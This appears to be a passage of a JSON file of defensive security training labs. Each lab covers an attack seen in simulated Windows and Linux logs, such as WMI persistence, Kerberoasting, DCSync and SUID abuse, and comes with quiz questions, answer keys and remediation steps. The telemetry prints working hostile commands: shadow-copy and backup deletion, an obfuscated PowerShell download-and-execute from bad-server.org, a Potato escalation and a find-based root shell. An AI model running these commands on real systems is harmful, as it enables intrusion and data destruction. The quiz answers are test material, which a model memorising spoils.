    "telemetry": "Sysmon Event ID 19: WmiEvent (WmiEventFilter activity detected)\n  Name: \"DefenseTelemetryHeartbeat\"\n  Query: \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"\nSysmon Event ID 20: WmiEvent (WmiEventConsumer activity detected)\n  Name: \"DefenseConsumer\"\n  CommandLineTemplate: \"powershell.exe -ExecutionPolicy Bypass -File C:\\ProgramData\\payload.ps1\"\nSysmon Event ID 21: WmiEvent (WmiEventConsumerToFilter activity detected)\n  Consumer: \"DefenseConsumer\"\n  Filter: \"DefenseTelemetryHeartbeat\"",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. Which Sysmon Event ID records the creation of a WmiEventFilter?",
        "expected": "19",
        "acceptedKeywords": [
          "19",
          "Sysmon 19",
          "Event 19"
        ],
        "hint": "Filter event code in Sysmon.",
        "explanation": "Expected: 19. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t2",
        "prompt": "2. Which Sysmon Event ID records the creation of a CommandLineEventConsumer?",
        "expected": "20",
        "acceptedKeywords": [
          "20",
          "Sysmon 20",
          "Event 20"
        ],
        "hint": "Consumer event code in Sysmon.",
        "explanation": "Expected: 20. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t3",
        "prompt": "3. What Sysmon Event ID binds the filter to the consumer (ConsumerToFilter)?",
        "expected": "21",
        "acceptedKeywords": [
          "21",
          "Sysmon 21",
          "Event 21"
        ],
        "hint": "Binding event code in Sysmon.",
        "explanation": "Expected: 21. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t4",
        "prompt": "4. What script path is configured for execution in the CommandLineTemplate?",
        "expected": "C:\\ProgramData\\payload.ps1",
        "acceptedKeywords": [
          "C:\\ProgramData\\payload.ps1"
        ],
        "hint": "PowerShell script location.",
        "explanation": "Expected: C:\\ProgramData\\payload.ps1. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t5",
        "prompt": "5. What PowerShell execution policy flag was supplied to bypass client restriction scripts?",
        "expected": "Bypass",
        "acceptedKeywords": [
          "Bypass",
          "-ExecutionPolicy Bypass"
        ],
        "hint": "Common execution policy flag.",
        "explanation": "Expected: Bypass. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t6",
        "prompt": "6. What PowerShell cmdlet query displays active WMI event filters in root\\subscription namespace?",
        "expected": "Get-CimInstance -Namespace root\\subscription -ClassName __EventFilter",
        "acceptedKeywords": [
          "Get-CimInstance",
          "Get-WmiObject",
          "__EventFilter"
        ],
        "hint": "PowerShell CIM cmdlet.",
        "explanation": "Expected: Get-CimInstance -Namespace root\\subscription -ClassName __EventFilter. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      }
    ],
    "remediationGuide": "Remove WMI filter and consumer using Get-CimInstance -Namespace root\\subscription | Remove-CimInstance and delete C:\\ProgramData\\payload.ps1."
  },
  {
    "id": "lab-end-007",
    "category": "Endpoint Security & Windows Internals",
    "title": "Token Impersonation & SeImpersonatePrivilege Abuse (Potato Exploits)",
    "difficulty": "Advanced",
    "timeEst": "20 min",
    "xpReward": 210,
    "briefing": "A compromised IIS web service running as \"NT AUTHORITY\\NETWORK SERVICE\" was elevated to SYSTEM by weaponizing the SeImpersonatePrivilege user right.",
    "telemetry": "User Privilege Check: whoami /priv\nPRIVILEGES INFORMATION\nPrivilege Name                Description                               State\n============================= ========================================= ========\nSeChangeNotifyPrivilege       Bypass traverse checking                  Enabled\nSeImpersonatePrivilege        Impersonate a client after authentication Enabled (VULNERABLE!)\nSeCreateGlobalPrivilege       Create global objects                     Enabled\n\nExecution: SweetPotato.exe -e cmd.exe -c \"whoami\"\nOutput: nt authority\\system\nSpawning elevated command console with full token privileges.",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. Which Windows privilege allows a process to impersonate any client that authenticates to it?",
        "expected": "SeImpersonatePrivilege",
        "acceptedKeywords": [
          "SeImpersonatePrivilege",
          "SeImpersonate"
        ],
        "hint": "Privilege shown enabled in whoami /priv.",
        "explanation": "Expected: SeImpersonatePrivilege. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t2",
        "prompt": "2. What family of privilege escalation tools (e.g. Rotten, Juicy, Sweet) targets this privilege?",
        "expected": "Potato",
        "acceptedKeywords": [
          "Potato",
          "RottenPotato",
          "JuicyPotato",
          "SweetPotato"
        ],
        "hint": "Named after a common root vegetable.",
        "explanation": "Expected: Potato. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t3",
        "prompt": "3. What default low-privileged system account typically runs web applications and possesses this privilege?",
        "expected": "NETWORK SERVICE",
        "acceptedKeywords": [
          "NETWORK SERVICE",
          "NT AUTHORITY\\NETWORK SERVICE",
          "LOCAL SERVICE"
        ],
        "hint": "Standard IIS / SQL service account.",
        "explanation": "Expected: NETWORK SERVICE. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t4",
        "prompt": "4. What command-line command displays all active privileges granted to the current user token?",
        "expected": "whoami /priv",
        "acceptedKeywords": [
          "whoami /priv",
          "whoami"
        ],
        "hint": "whoami with privilege flag.",
        "explanation": "Expected: whoami /priv. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t5",
        "prompt": "5. What account context was achieved following execution of the exploit?",
        "expected": "nt authority\\system",
        "acceptedKeywords": [
          "nt authority\\system",
          "SYSTEM"
        ],
        "hint": "Output line in telemetry.",
        "explanation": "Expected: nt authority\\system. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t6",
        "prompt": "6. What Windows security baseline hardening removes SeImpersonatePrivilege from service accounts?",
        "expected": "User Rights Assignment",
        "acceptedKeywords": [
          "User Rights Assignment",
          "Group Policy",
          "GPO"
        ],
        "hint": "Security Policy section under Local Policies.",
        "explanation": "Expected: User Rights Assignment. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      }
    ],
    "remediationGuide": "Remove SeImpersonatePrivilege from service accounts via secpol.msc -> Local Policies -> User Rights Assignment, and run services under virtual accounts or gMSAs."
  },
  {
    "id": "lab-end-008",
    "category": "Endpoint Security & Windows Internals",
    "title": "Volume Shadow Copy Deletion Forensics (vssadmin / bcdedit)",
    "difficulty": "Intermediate",
    "timeEst": "15 min",
    "xpReward": 170,
    "briefing": "Ransomware telemetry was intercepted on an engineering fileserver right before file encryption commenced. Analyze the anti-recovery commands launched by the operator.",
    "telemetry": "Timestamp: 2026-09-29 04:01:10 UTC\nParent Process: C:\\Windows\\Temp\\update_srv.exe (PID 3410)\nCommand 1: cmd.exe /c vssadmin.exe delete shadows /all /quiet\nCommand 2: cmd.exe /c wmic shadowcopy delete\nCommand 3: cmd.exe /c bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures\nCommand 4: cmd.exe /c bcdedit.exe /set {default} recoveryenabled no\nCommand 5: cmd.exe /c wbadmin.exe delete catalog -quiet",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What command-line tool was invoked in Command 1 to delete all Volume Shadow Copies silently?",
        "expected": "vssadmin.exe",
        "acceptedKeywords": [
          "vssadmin.exe",
          "vssadmin"
        ],
        "hint": "Volume Shadow Copy administrative tool.",
        "explanation": "Expected: vssadmin.exe. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t2",
        "prompt": "2. What parameter was passed to vssadmin to suppress user confirmation prompts?",
        "expected": "/quiet",
        "acceptedKeywords": [
          "/quiet",
          "-quiet"
        ],
        "hint": "Quiet mode switch.",
        "explanation": "Expected: /quiet. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t3",
        "prompt": "3. What boot configuration tool was invoked in Command 3 and 4 to disable Windows recovery options?",
        "expected": "bcdedit.exe",
        "acceptedKeywords": [
          "bcdedit.exe",
          "bcdedit"
        ],
        "hint": "Boot Configuration Data editor.",
        "explanation": "Expected: bcdedit.exe. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t4",
        "prompt": "4. What backup management tool was invoked in Command 5 to delete the local backup catalog?",
        "expected": "wbadmin.exe",
        "acceptedKeywords": [
          "wbadmin.exe",
          "wbadmin"
        ],
        "hint": "Windows Backup command-line tool.",
        "explanation": "Expected: wbadmin.exe. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t5",
        "prompt": "5. What type of malware attack almost universally executes this exact command sequence prior to impact?",
        "expected": "Ransomware",
        "acceptedKeywords": [
          "Ransomware",
          "ransomware"
        ],
        "hint": "Malware family that encrypts files and demands payment.",
        "explanation": "Expected: Ransomware. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t6",
        "prompt": "6. What Process ID (PID) belonged to the parent malicious updater executing these commands?",
        "expected": "3410",
        "acceptedKeywords": [
          "3410"
        ],
        "hint": "Parent Process PID in log.",
        "explanation": "Expected: 3410. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      }
    ],
    "remediationGuide": "Deploy EDR rules to block vssadmin delete shadows, maintain immutable air-gapped backups, and terminate PID 3410 immediately."
  },
  {
    "id": "lab-end-009",
    "category": "Endpoint Security & Windows Internals",
    "title": "Kerberoasting & SPN Service Ticket Extraction (Event 4769)",
    "difficulty": "Advanced",
    "timeEst": "20 min",
    "xpReward": 220,
    "briefing": "An unprivileged domain user requested Kerberos TGS service tickets with weak RC4 encryption for enterprise service accounts, aiming to crack passwords offline.",
    "telemetry": "Log Name: Security | Event ID: 4769 | Audit Success: Kerberos Service Ticket Operations\nAccount Information:\n  Account Name: cadet_sharma@TACTICAL.MIL\nService Information:\n  Service Name: MSSQLSvc/sql01.tactical.mil:1433\n  Service ID: S-1-5-21-3948192-500\nNetwork Information:\n  Client Address: ::ffff:10.0.5.88\nAdditional Information:\n  Ticket Options: 0x40810000\n  Ticket Encryption Type: 0x17 (RC4-HMAC - WEAK/VULNERABLE!)",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What Windows Security Event ID records a Kerberos Service Ticket (TGS) request?",
        "expected": "4769",
        "acceptedKeywords": [
          "4769",
          "Event 4769"
        ],
        "hint": "Standard Active Directory Kerberos ticket event.",
        "explanation": "Expected: 4769. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t2",
        "prompt": "2. What legacy, crackable encryption type is represented by the hex code 0x17 in Event 4769?",
        "expected": "RC4-HMAC",
        "acceptedKeywords": [
          "RC4-HMAC",
          "RC4",
          "0x17"
        ],
        "hint": "Weak symmetric cipher vulnerable to fast GPU cracking.",
        "explanation": "Expected: RC4-HMAC. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t3",
        "prompt": "3. What Service Principal Name (SPN) target was requested by cadet_sharma?",
        "expected": "MSSQLSvc/sql01.tactical.mil:1433",
        "acceptedKeywords": [
          "MSSQLSvc/sql01.tactical.mil:1433",
          "MSSQLSvc"
        ],
        "hint": "Service Name attribute in telemetry.",
        "explanation": "Expected: MSSQLSvc/sql01.tactical.mil:1433. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t4",
        "prompt": "4. What modern Kerberos encryption type (e.g. 0x12) should be mandated across Active Directory?",
        "expected": "AES-256",
        "acceptedKeywords": [
          "AES-256",
          "AES",
          "AES256-CTS-HMAC-SHA1-96"
        ],
        "hint": "Strongest standard Kerberos encryption.",
        "explanation": "Expected: AES-256. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t5",
        "prompt": "5. What attack technique extracts Kerberos service tickets for offline hash cracking with Hashcat?",
        "expected": "Kerberoasting",
        "acceptedKeywords": [
          "Kerberoasting",
          "kerberoast"
        ],
        "hint": "Famous AD attack technique coined by Tim Medin.",
        "explanation": "Expected: Kerberoasting. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t6",
        "prompt": "6. What requesting cadet account initiated the anomalous ticket query?",
        "expected": "cadet_sharma",
        "acceptedKeywords": [
          "cadet_sharma",
          "cadet_sharma@TACTICAL.MIL"
        ],
        "hint": "Account Name in event.",
        "explanation": "Expected: cadet_sharma. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      }
    ],
    "remediationGuide": "Disable RC4-HMAC encryption in Active Directory Kerberos policies, set complex 25+ character passwords for SPN accounts, and migrate to Group Managed Service Accounts (gMSA)."
  },
  {
    "id": "lab-end-010",
    "category": "Endpoint Security & Windows Internals",
    "title": "Sysmon Event ID 1: Anomalous Parent-Child Process Trees",
    "difficulty": "Intermediate",
    "timeEst": "15 min",
    "xpReward": 160,
    "briefing": "Analyze Sysmon Event ID 1 telemetry where a Microsoft Office process (winword.exe) spawned an interactive PowerShell console with encoded execution parameters.",
    "telemetry": "Sysmon Event ID 1: Process Creation\nUtcTime: 2026-09-29 14:22:15.890\nProcessId: 5812\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nCommandLine: powershell.exe -nop -w hidden -e aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAA...\nCurrentDirectory: C:\\Users\\cadet\\Documents\\\nParentProcessId: 2104\nParentImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\nParentCommandLine: \"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\cadet\\Downloads\\Urgent_Defense_Brief.docm\"",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What executable was the parent process that spawned powershell.exe?",
        "expected": "WINWORD.EXE",
        "acceptedKeywords": [
          "WINWORD.EXE",
          "winword.exe",
          "Microsoft Word"
        ],
        "hint": "ParentImage file in telemetry.",
        "explanation": "Expected: WINWORD.EXE. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t2",
        "prompt": "2. What file extension indicates that the opened Word document contains active embedded macros?",
        "expected": ".docm",
        "acceptedKeywords": [
          ".docm",
          "docm"
        ],
        "hint": "Macro-enabled Word document extension.",
        "explanation": "Expected: .docm. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t3",
        "prompt": "3. What Sysmon Event ID records detailed Process Creation events?",
        "expected": "1",
        "acceptedKeywords": [
          "1",
          "Sysmon 1",
          "Event 1"
        ],
        "hint": "Primary process execution event code in Sysmon.",
        "explanation": "Expected: 1. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t4",
        "prompt": "4. What Process ID (PID) was assigned to the newly created malicious PowerShell process?",
        "expected": "5812",
        "acceptedKeywords": [
          "5812"
        ],
        "hint": "ProcessId field.",
        "explanation": "Expected: 5812. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t5",
        "prompt": "5. What PowerShell argument \"-nop\" disables loading user profile scripts?",
        "expected": "-NoProfile",
        "acceptedKeywords": [
          "-NoProfile",
          "-nop",
          "NoProfile"
        ],
        "hint": "NoProfile shorthand.",
        "explanation": "Expected: -NoProfile. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t6",
        "prompt": "6. What Microsoft security control blocks Office applications from creating child processes?",
        "expected": "Attack Surface Reduction",
        "acceptedKeywords": [
          "Attack Surface Reduction",
          "ASR",
          "ASR Rules"
        ],
        "hint": "Windows Defender ASR feature.",
        "explanation": "Expected: Attack Surface Reduction. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      }
    ],
    "remediationGuide": "Enable Defender ASR Rule \"Block Office applications from creating child processes\" (GUID: d4f940ab-401b-4efc-aadc-ad5f3c50688a) and terminate PID 5812."
  },
  {
    "id": "lab-end-011",
    "category": "Endpoint Security & Windows Internals",
    "title": "PowerShell ScriptBlock Logging & Obfuscation Triage (Event 4104)",
    "difficulty": "Intermediate",
    "timeEst": "15 min",
    "xpReward": 150,
    "briefing": "Adversaries utilized backtick characters, string reversals, and variable concatenation to evade simple command string matches. De-obfuscate the logged ScriptBlock.",
    "telemetry": "Log Name: Microsoft-Windows-PowerShell/Operational | Event ID: 4104\nLevel: Warning | Computer: WS-CADET-01\nScriptBlock ID: 382b9a10-291a-49a8-a812-78192a019b88\nMessage:\nCreating Scriptblock text (1 of 1):\n$x = \"Down\"+\"load\"+\"String\";\n$u = \"ht\"+\"tp://\"+\"bad-server.org/agent.ps1\";\n$w = (New-Object Net.WebClient);\nI`E`X ($w.$x.Invoke($u));\nDe-obfuscated Command: IEX (New-Object Net.WebClient).DownloadString(\"http://bad-server.org/agent.ps1\")",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What Windows PowerShell Operational Event ID logs complete ScriptBlock code execution?",
        "expected": "4104",
        "acceptedKeywords": [
          "4104",
          "Event 4104"
        ],
        "hint": "Standard ScriptBlock logging event.",
        "explanation": "Expected: 4104. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t2",
        "prompt": "2. What cmdlet alias \"IEX\" executes string content as active code in PowerShell?",
        "expected": "Invoke-Expression",
        "acceptedKeywords": [
          "Invoke-Expression",
          "IEX"
        ],
        "hint": "Full cmdlet name for IEX.",
        "explanation": "Expected: Invoke-Expression. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t3",
        "prompt": "3. What remote URL payload was targeted by the DownloadString method?",
        "expected": "http://bad-server.org/agent.ps1",
        "acceptedKeywords": [
          "http://bad-server.org/agent.ps1"
        ],
        "hint": "The reassembled string variable $u.",
        "explanation": "Expected: http://bad-server.org/agent.ps1. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t4",
        "prompt": "4. What character was used as an inline escape character (I`E`X) to break signature detection?",
        "expected": "Backtick",
        "acceptedKeywords": [
          "Backtick",
          "`",
          "grave accent"
        ],
        "hint": "PowerShell escape character.",
        "explanation": "Expected: Backtick. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t5",
        "prompt": "5. What .NET framework class was instantiated via New-Object to manage web requests?",
        "expected": "Net.WebClient",
        "acceptedKeywords": [
          "Net.WebClient",
          "System.Net.WebClient",
          "WebClient"
        ],
        "hint": "Common legacy .NET web class.",
        "explanation": "Expected: Net.WebClient. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t6",
        "prompt": "6. What language mode restricts PowerShell to core language elements and disables custom types?",
        "expected": "Constrained Language Mode",
        "acceptedKeywords": [
          "Constrained Language Mode",
          "CLM",
          "ConstrainedLanguage"
        ],
        "hint": "Security mode often paired with AppLocker.",
        "explanation": "Expected: Constrained Language Mode. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      }
    ],
    "remediationGuide": "Enforce PowerShell Constrained Language Mode via AppLocker, enable ScriptBlock Logging globally via GPO, and block bad-server.org."
  },
  {
    "id": "lab-end-012",
    "category": "Endpoint Security & Windows Internals",
    "title": "Process Injection & DLL Sideloading Detection",
    "difficulty": "Advanced",
    "timeEst": "18 min",
    "xpReward": 200,
    "briefing": "A legitimate signed binary (calc.exe) loaded an unsigned DLL named \"winhttp.dll\" from the user Downloads folder instead of C:\\Windows\\System32, executing covert shellcode.",
    "telemetry": "Image Loaded:\n  UtcTime: 2026-09-29 16:04:12.112\n  ProcessId: 4120\n  Image: C:\\Users\\cadet\\Downloads\\calc.exe (Verified: Microsoft Corporation)\n  ImageLoaded: C:\\Users\\cadet\\Downloads\\winhttp.dll (Signed: FALSE)\n  OriginalFileName: winhttp.dll\n  Hashes: SHA256=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\nSysmon Event ID 7: Image loaded by calc.exe from untrusted user directory.",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What cyber attack technique exploits DLL search order to execute malicious code via trusted binaries?",
        "expected": "DLL Sideloading",
        "acceptedKeywords": [
          "DLL Sideloading",
          "DLL Hijacking",
          "DLL Search Order Hijacking"
        ],
        "hint": "Planting malicious DLL alongside signed executable.",
        "explanation": "Expected: DLL Sideloading. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t2",
        "prompt": "2. What Sysmon Event ID monitors DLL image loading events?",
        "expected": "7",
        "acceptedKeywords": [
          "7",
          "Sysmon 7",
          "Event 7"
        ],
        "hint": "Image loaded event code in Sysmon.",
        "explanation": "Expected: 7. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t3",
        "prompt": "3. What was the name of the unsigned rogue DLL placed in Downloads?",
        "expected": "winhttp.dll",
        "acceptedKeywords": [
          "winhttp.dll"
        ],
        "hint": "ImageLoaded filename.",
        "explanation": "Expected: winhttp.dll. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t4",
        "prompt": "4. What legitimate directory should winhttp.dll normally be loaded from on 64-bit Windows?",
        "expected": "C:\\Windows\\System32",
        "acceptedKeywords": [
          "C:\\Windows\\System32",
          "System32"
        ],
        "hint": "Core Windows 64-bit library folder.",
        "explanation": "Expected: C:\\Windows\\System32. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t5",
        "prompt": "5. Is the rogue DLL in the Downloads folder cryptographically signed by Microsoft?",
        "expected": "FALSE",
        "acceptedKeywords": [
          "FALSE",
          "No",
          "False",
          "unsigned"
        ],
        "hint": "Signed attribute in telemetry.",
        "explanation": "Expected: FALSE. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t6",
        "prompt": "6. What mitigation restricts DLL searches to the system directory only in applications?",
        "expected": "SetDefaultDllDirectories",
        "acceptedKeywords": [
          "SetDefaultDllDirectories",
          "SafeDllSearchMode",
          "Safe DLL Search"
        ],
        "hint": "Win32 API or registry setting for secure DLL loading.",
        "explanation": "Expected: SetDefaultDllDirectories. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      }
    ],
    "remediationGuide": "Enable SafeDllSearchMode in registry, restrict application execution from user Downloads folder using AppLocker / Software Restriction Policies, and isolate PID 4120."
  },
  {
    "id": "lab-end-013",
    "category": "Endpoint Security & Windows Internals",
    "title": "Named Pipe Impersonation & Cobalt Strike Beacon Detection",
    "difficulty": "Advanced",
    "timeEst": "18 min",
    "xpReward": 210,
    "briefing": "Threat actors utilized SMB named pipes to coordinate stealthy lateral movement between segmented enclaves without initiating direct raw TCP port bindings.",
    "telemetry": "Sysmon Event ID 17: PipeEvent (Pipe Created)\n  PipeName: \\msagent_4f21\n  ProcessId: 3812\n  Image: C:\\Windows\\Temp\\rundll32.exe\nSysmon Event ID 18: PipeEvent (Pipe Connected)\n  PipeName: \\msagent_4f21\n  ProcessId: 4404\n  Image: C:\\Windows\\System32\\spoolsv.exe\nAnalysis: Named pipe pattern \"\\msagent_*\" matches default malleable C2 profile for Cobalt Strike Beacon lateral pivot.",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What IPC (Inter-Process Communication) mechanism was used by the attacker to coordinate processes?",
        "expected": "Named Pipe",
        "acceptedKeywords": [
          "Named Pipe",
          "Named Pipes",
          "SMB Pipe"
        ],
        "hint": "Windows mechanism represented with \\\\pipe\\\\ or \\\\msagent_*.",
        "explanation": "Expected: Named Pipe. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t2",
        "prompt": "2. What Sysmon Event ID records pipe creation events on Windows endpoints?",
        "expected": "17",
        "acceptedKeywords": [
          "17",
          "Sysmon 17",
          "Event 17"
        ],
        "hint": "Sysmon pipe creation event number.",
        "explanation": "Expected: 17. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t3",
        "prompt": "3. What famous adversary emulation / C2 framework defaults to named pipes like \"\\msagent_*\"?",
        "expected": "Cobalt Strike",
        "acceptedKeywords": [
          "Cobalt Strike",
          "CobaltStrike"
        ],
        "hint": "Commercial adversary simulation tool.",
        "explanation": "Expected: Cobalt Strike. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t4",
        "prompt": "4. What executable in C:\\Windows\\Temp created the named pipe?",
        "expected": "rundll32.exe",
        "acceptedKeywords": [
          "rundll32.exe",
          "C:\\Windows\\Temp\\rundll32.exe"
        ],
        "hint": "Process image in Event 17.",
        "explanation": "Expected: rundll32.exe. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t5",
        "prompt": "5. What Windows protocol encapsulates named pipes across the network on port 445?",
        "expected": "SMB",
        "acceptedKeywords": [
          "SMB",
          "Server Message Block"
        ],
        "hint": "Standard Windows file sharing protocol.",
        "explanation": "Expected: SMB. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t6",
        "prompt": "6. What Sysmon Event ID records client connections to existing named pipes?",
        "expected": "18",
        "acceptedKeywords": [
          "18",
          "Sysmon 18",
          "Event 18"
        ],
        "hint": "Companion pipe connected event code.",
        "explanation": "Expected: 18. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      }
    ],
    "remediationGuide": "Deploy YARA and EDR signatures to detect default Cobalt Strike named pipe patterns (\\msagent_*, \\status_*, \\postex_*), and isolate rundll32.exe executions."
  },
  {
    "id": "lab-end-014",
    "category": "Endpoint Security & Windows Internals",
    "title": "Golden Ticket & DCSync Domain Controller Compromise Forensics",
    "difficulty": "Advanced",
    "timeEst": "22 min",
    "xpReward": 250,
    "briefing": "Directory Service Replication APIs were invoked by a workstation that is NOT a domain controller. The adversary exfiltrated the KRBTGT master password hash to forge Golden Tickets.",
    "telemetry": "Log Name: Security | Event ID: 4662 | Directory Service Object Operation\nObject Server: DS | Object Type: {19195a5b-6da0-11d0-afd3-00c04fd930c9} (domainDNS)\nAccess Mask: 0x100 (Control Access)\nProperties: {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} (DS-Replication-Get-Changes)\n            {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} (DS-Replication-Get-Changes-All)\nSubject: Account Name: cadet_guest$ | Account Domain: TACTICAL | Client IP: 10.0.4.55\nALERT: Non-DC machine account requested complete directory replication!",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What devastating Active Directory attack mimics domain controller replication to dump all hashes?",
        "expected": "DCSync",
        "acceptedKeywords": [
          "DCSync",
          "Directory Replication"
        ],
        "hint": "Mimikatz feature lsadump::dcsync.",
        "explanation": "Expected: DCSync. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t2",
        "prompt": "2. What master Active Directory account hash is forged to create Golden Tickets granting permanent domain admin?",
        "expected": "KRBTGT",
        "acceptedKeywords": [
          "KRBTGT",
          "krbtgt"
        ],
        "hint": "Key Distribution Center service account in AD.",
        "explanation": "Expected: KRBTGT. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t3",
        "prompt": "3. What Windows Security Event ID tracks operations performed on Active Directory objects?",
        "expected": "4662",
        "acceptedKeywords": [
          "4662",
          "Event 4662"
        ],
        "hint": "Audit Directory Service Access event code.",
        "explanation": "Expected: 4662. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t4",
        "prompt": "4. What extended right GUID \"{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}\" enables replicating all secrets?",
        "expected": "DS-Replication-Get-Changes-All",
        "acceptedKeywords": [
          "DS-Replication-Get-Changes-All",
          "Replicating Directory Changes All"
        ],
        "hint": "Specific replication permission name.",
        "explanation": "Expected: DS-Replication-Get-Changes-All. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t5",
        "prompt": "5. What client IP address initiated the unauthorized replication request?",
        "expected": "10.0.4.55",
        "acceptedKeywords": [
          "10.0.4.55"
        ],
        "hint": "Client IP in telemetry.",
        "explanation": "Expected: 10.0.4.55. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t6",
        "prompt": "6. What critical remediation procedure is required if the KRBTGT account hash is compromised?",
        "expected": "Reset KRBTGT password twice",
        "acceptedKeywords": [
          "Reset KRBTGT password twice",
          "Reset KRBTGT twice",
          "reset krbtgt",
          "rotate krbtgt"
        ],
        "hint": "Must be rotated twice to invalidate current and previous tickets.",
        "explanation": "Expected: Reset KRBTGT password twice. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      }
    ],
    "remediationGuide": "Immediately perform the two-stage KRBTGT password rotation script, revoke rogue replication permissions from non-DC principals, and isolate host 10.0.4.55."
  },
  {
    "id": "lab-lin-001",
    "category": "Linux Security & Bash Hardening",
    "title": "Linux SUID Binary Exploitation (/usr/bin/find & nmap)",
    "difficulty": "Beginner",
    "timeEst": "14 min",
    "xpReward": 140,
    "briefing": "An unprivileged cadet account identified binaries with the SetUID bit set, allowing commands to execute with effective root UID 0.",
    "telemetry": "Command: find / -perm -4000 -type f -exec ls -la {} + 2>/dev/null\n-rwsr-xr-x 1 root root  548128 Feb 12 2026 /usr/bin/find\n-rwsr-xr-x 1 root root   85240 Jan 18 2026 /usr/bin/passwd\nExploitation:\ncadet@linux-range:~$ /usr/bin/find . -exec /bin/sh -p \\; -quit\n# whoami\nroot\n# id\nuid=1001(cadet) euid=0(root) groups=1001(cadet)",
    "tasks": [
      {
        "id": "t1",
